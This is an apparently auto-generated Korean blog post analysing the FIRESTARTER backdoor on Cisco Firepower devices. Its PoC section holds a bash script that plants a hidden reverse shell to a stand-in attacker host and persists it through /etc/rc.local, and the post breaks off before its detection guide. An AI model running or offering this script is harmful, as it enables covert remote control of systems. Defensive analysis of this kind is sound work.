---
title: "FIRESTARTER Backdoor: Cisco Firepower 장비 탈취와 패치 회피 분석"
date: 2026-04-29T01:07:05+09:00
draft: false
categories: ["보안"]
tags: ["보안"]
author: "Intelligence Agent"
---

## 서론

화요일 아침, SOC(Security Operations Center) 대시보드의 빨간 불이 깜빡이기 시작했습니다. 내부 네트워크에서 민감한 데이터가 외부로 유출되고 있다는 경고였지만, 이상하게도 방화벽 로그에는 해당 트래픽에 대한 기록이 전혀 없었습니다. 며칠 간의 치열한 포렌식 끝에 보안 팀은 충격적인 사실을 발견했습니다. 네트워크의 심장부인 보안 장비, 즉 Cisco Firepower 자체가 해커의 수중에 들어가 있었던 것입니다.

더욱 경악스러운 점은 해커가 사용한 백도어인 'FIRESTARTER'의 특성입니다. 일반적으로 보안 관제자는 악성코드가 발견되면 장비를 재부팅하거나 펌웨어를 업데이트(패치)하여 문제를 해결합니다. 그러나 FIRESTARTER는 이러한 일반적인 살균 절차를 모두 무시하고 살아남았습니다. 장비를 공장 초기화(Factory Reset)해도 여전히 백도어는 존재했습니다.

이 사건은 우리에게 "방어선의 최전선에 있는 장비가 공격받으면 어떻게 되는가?"라는 근본적인 질문을 던집니다. 이 글에서는 방어 목적(Defensive Purpose)으로 FIRESTARTER 백도어의 기술적 작동 원리를 심층 분석하고, 왜 기존 패치가 통하지 않았는지, 그리고 실제 현장에서 이를 어떻게 탐지하고 제거해야 하는지 다루고자 합니다.

## 본론

### 1. FIRESTARTER의 작동 원리와 지속성(Persistence) 메커니즘

FIRESTARTER는 단순한 악성 스크립트가 아닙니다. 이는 Cisco Firepower Threat Defense(FTD) 장비의底层(Low-level) 부팅 구조를 목표로 합니다. Cisco Firepower는 내부적으로 Linux 기반의 OS를 사용합니다. 공격자는 이러한 리눅스 환경의 취약점을 이용해 관리자 권한(Root)을 획득한 후, 운영체제의 부팅 순서를 조작합니다.

일반적인 백도어는 사용자 계정 디렉터리나 시스템 데몬 설정 파일에 숨지만, FIRESTARTER는 장비의 펌웨어 이미지가 로드되기 전 단계인 **부트로더(Bootloader) 환경 설정**이나 **스타트업 스크립트**를 수정합니다.

이로 인해 다음과 같은 현상이 발생합니다. 1.  장비 전원이 켜짐 2.  Cisco 소프트웨어가 아닌, 공격자가 심은 악성 코드가 가장 먼저 실행됨 3.  악성 코드가 백도어 쉘(Reverse Shell)을 열어 C2(Command & Control) 서버와 연결 4.  그 후에야 정상적인 Cisco Firepower 소프트웨어가 구동됨

사용자 입장에서는 방화벽이 정상적으로 켜졌고 트래픽도 잘 막고 있으니 문제가 없다고 생각하지만, 실제로는 시스템 바로 밑바닥에서 해커가 시스템을 장악하고 있는 상태입니다. 펌웨어 업데이트는 주로 소프트웨어 파티션에 있는 파일들을 덮어쓰지만, 부팅 설정이나 별도의 숨겨진 파티션에 있는 백도어는 건드리지 못하기 때문에 공격이 지속되는 것입니다.

### 2. 공격 흐름도 시각화

FIRESTARTER가 시스템을 장악하고 유지하는 과정을 간단하게 다이어그램으로 표현하면 다음과 같습니다.

```javascript
graph TD
    A[Initial Exploit] --> B[Root Access Acquisition]
    B --> C[Modify Boot Config]
    C --> D[Implant Malicious Script]
    D --> E[System Reboot / Update]
    E --> F[Malware Loads First]
    F --> G[Connects to C2 Server]
    G --> H[Attacker Maintains Control]
    H --> I[Normal Firepower OS Starts]
```

### 3. 개념 증명(PoC) 코드: 리눅스 부팅 스크립트 변조 분석

방어 목적의 학습을 위해, 공격자가 리눅스 기반 장비에서 어떻게 지속성을 확보하는지 그 원리를 이해해야 합니다. 아래 예시는 `/etc/rc.local` 시스템 부팅 스크립트를 조작하여 시스템이 시작될 때마다 공격자에게 쉘을 제공하는 기술적 원리를 보여주는 **교육용 코드**입니다.

**주의: 이 코드는 학습 및 연구 목적으로만 참고해야 하며, 승인되지 않은 시스템에 실행하는 것은 불법입니다.**

```bash
#!/bin/bash

# [Scenario] 공격자가 이미 루트 권한을 획득한 상태라고 가정
# 공격자의 목표: 시스템이 부팅될 때마다 자동으로 백도어를 실행

# 1. 백도어 바이너리 또는 스크립트 생성 (실제 공격에서는 더 은폐된 방식 사용)
cat > /tmp/.hidden_service.sh << 'EOF'
#!/bin/bash
while true; do
    # C2 서버(공격자 서버)로의 역접속 시도
    /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
    sleep 3600 # 연결이 끊기면 1시간 후 재시도
done
EOF

chmod +x /tmp/.hidden_service.sh

# 2. 지속성(Persistence) 확보: 부팅 시 자동 실행되도록 설정
# /etc/rc.local은 리눅스 시스템 부팅 과정에서 가장 마지막에 실행되는 스크립트입니다.
# FIRESTARTER와 유사하게, 이 파일이 시스템 업데이트에도 삭제되지 않도록 설정하거나
# 다른 부트 로더 스크립트(initscripts 등)를 타겟팅할 수 있습니다.

if [ -f /etc/rc.local ]; then
    # 이미 존재하면 백업 후 덮어쓰기 또는 추가
    echo "nohup /tmp/.hidden_service.sh &" >> /etc/rc.local
else
    # 파일이 없으면 생성
    echo "#!/bin/sh -e" > /etc/rc.local
    echo "nohup /tmp/.hidden_service.sh &" >> /etc/rc.local
    chmod +x /etc/rc.local
fi

echo "[*] Persistence mechanism established."
```

실제 FIRESTARTER는 `/etc/rc.local`뿐만 아니라 `fstab` 파일 시스템 테이블을 조작하거나, 정상적인 바이너리를 악성 버전으로 교체(Linux binary replacement)하여 탐지를 회피하는 고도의 기술을 사용합니다.

### 4. 일반 백도어와 FIRESTARTER의 기술적 차이 비교

이 공격이 위험한 이유는 기존의 방식과 확실히 다르기 때문입니다. 아래 표는 일반적인 웹 쉘(Webshell)이나 악성코드와 FIRESTARTER의 차이점을 비교한 것입니다.

| 비교 항목 | 일반적인 악성코드 / 웹 쉘 | FIRESTARTER 백도어 | | :--- | :--- | :--- | | **저장 위치** | 웹 루트 디렉터리, 사용자 홈 디렉터리 | 시스템 부팅 파티션, 환경 변수, 깊숙한 OS 레벨 | | **지속성(Persistence)** | 서비스 등록, 작업 스케줄러 | 부트로더 설정, init 스크립트 변조 | | **패치/업데이트 내성** | ❌ 소프트웨어 업데이트 시 삭제됨 | ✅ 소프트웨어 업데이트로도 유지됨 (High Survivability) | | **탐지 난이도** | 보안 솔루션 탐지 용이 | 파일 시그니처 기반 탐지가 어려움 (Behavioral 분석 필요) | | **제거 방법** | 악성 파일 삭제, 서비스 중지 | 펌웨어 완전 교체 또는 전용 제거 도구 실행 필요 |

### 5. 침투 테스트 관점에서의 방어 및 검수 가이드 (Step-by-Step)

만약 귀하의 관리 하에 있는 Cisco Firepower 장비가 공격받았거나 의심스러운 상황이라면, 다음 절차에 따라 검수

---

**출처**: [https://news.google.com/rss/articles/CBMigwFBVV95cUxQWE42S2NyQWxFeVVScW9ZSVpxbkFJZnVHQzJwTWVSN1RjNHA3dTVmSHJRN01FME01ZWwzR2R6MEVVdWNmdGdIVktsak1iVVl2UmU5QjhOMWU0dWJGTWJmNVIxaGwtQlVjUld0bTdiOVdhZ0hRXzE3WTBlejlLWnhSUGo5aw?oc=5](https://news.google.com/rss/articles/CBMigwFBVV95cUxQWE42S2NyQWxFeVVScW9ZSVpxbkFJZnVHQzJwTWVSN1RjNHA3dTVmSHJRN01FME01ZWwzR2R6MEVVdWNmdGdIVktsak1iVVl2UmU5QjhOMWU0dWJGTWJmNVIxaGwtQlVjUld0bTdiOVdhZ0hRXzE3WTBlejlLWnhSUGo5aw?oc=5)